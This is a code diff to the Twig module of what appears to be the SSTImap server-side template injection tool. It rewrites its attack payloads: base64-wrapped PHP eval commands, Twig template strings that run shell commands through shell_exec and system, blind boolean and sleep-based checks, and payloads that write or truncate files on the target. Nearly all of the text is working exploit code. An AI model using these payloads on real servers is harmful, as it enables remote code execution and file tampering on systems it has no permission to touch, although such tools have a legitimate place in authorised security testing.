@@ -40,40 +40,40 @@ class Twig(php.Php):
             # Hackish way to evaluate PHP code
             'evaluate': {
                 'call': 'execute',
-                'evaluate': """php -r '$d="{code_b64}";eval(base64_decode(str_pad(strtr($d,"-_","+/"),strlen($d)%4,"=",STR_PAD_RIGHT)));'""",
+                'evaluate': """php -r 'eval(base64_decode("{code_b64p}"));'""",
                 'test_os': 'echo PHP_OS;',
                 'test_os_expected': r'^[\w-]+$'
             },
             'evaluate_boolean': {
                 'call': 'execute_blind',
-                'evaluate_blind': """php -r '$d="{code_b64}";1 / (true && eval("return (" . base64_decode(str_pad(strtr($d, "-_", "+/"), strlen($d)%4,"=",STR_PAD_RIGHT)) . ");"));'""",
+                'evaluate_blind': """php -r '1 / (true && eval("return (" . base64_decode("{code_b64p}") . ");"));'""",
             },
             'evaluate_blind': {
                 'call': 'execute',
-                'evaluate_blind': """php -r '$d="{code_b64}";eval("return (" . base64_decode(str_pad(strtr($d, "-_", "+/"), strlen($d)%4,"=",STR_PAD_RIGHT)) . ") && sleep({delay});");'"""
+                'evaluate_blind': """php -r 'eval("return (" . base64_decode("{code_b64p}") . ") && sleep({delay});");'"""
             },
             'execute': {
                 'call': 'render',
-                'execute': """{{% for a in ["bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}'"]|filter("system") %}}{{% endfor %}}""",
+                'execute': """{{%set p={{"{code_b64p}":"base64_decode"}}|map("call_user_func")|join%}}{{{{ {{(p):"shell_exec"}}|map("call_user_func")|join }}}}""",
                 'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                 'test_cmd_expected': rand.randstrings[2]
             },
             'execute_error': {
-                'execute': """{{%set b={{"bash -c '({{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}})'":"shell_exec"}}|map("call_user_func")|join%}}""",
+                'execute': """{{%set p={{"{code_b64p}":"base64_decode"}}|map("call_user_func")|join%}}{{%set b={{(p):"shell_exec"}}|map("call_user_func")|join%}}""",
             },
             # Hackish way to check success
             'execute_boolean': {
                 'call': 'inject',
-                'execute_blind': """{{{{ 1 / ({{"bash -c '({{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}&&{{echo,SSTIMAP}})'":"shell_exec"}}|map("call_user_func")|join|trim('\\n') ends with "SSTIMAP") }}}}"""
+                'execute_blind': """{{%set p={{"{code_b64p}":"base64_decode"}}|map("call_user_func")|join%}}{{{{ 1 / ({{(p):"shell_exec"}}|map("call_user_func")|join|trim('\\n') ends with "SSTIMAP") }}}}"""
             },
             'execute_blind': {
                 'call': 'inject',
-                'execute_blind': """{{{{ ["bash -c '{{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}&&{{sleep,{delay}}}'"]|filter("system") }}}}"""
+                'execute_blind': """{{%set p={{"{code_b64p}":"base64_decode"}}|map("call_user_func")|join%}}{{{{ {{([p, "&& sleep {delay}"]|join):"shell_exec"}}|map("call_user_func")|join }}}}"""
             },
             'write': {
                 'call': 'inject',
-                'write': """{{{{ ["bash -c '{{tr,_-,/+}}<<<{chunk_b64}|{{base64,-d}}>>{path}'"]|filter("system") }}}}""",
-                'truncate': """{{{{ ["echo -n >{path}"]|filter("system") }}}}"""
+                'write': """{{{{ {{"echo -n '{chunk_b64p}'|base64 -d>>{path}":"shell_exec"}}|map("call_user_func")|join }}}}""",
+                'truncate': """{{{{ {{"echo -n >{path}":"shell_exec"}}|map("call_user_func")|join }}}}"""
             },
         })
 
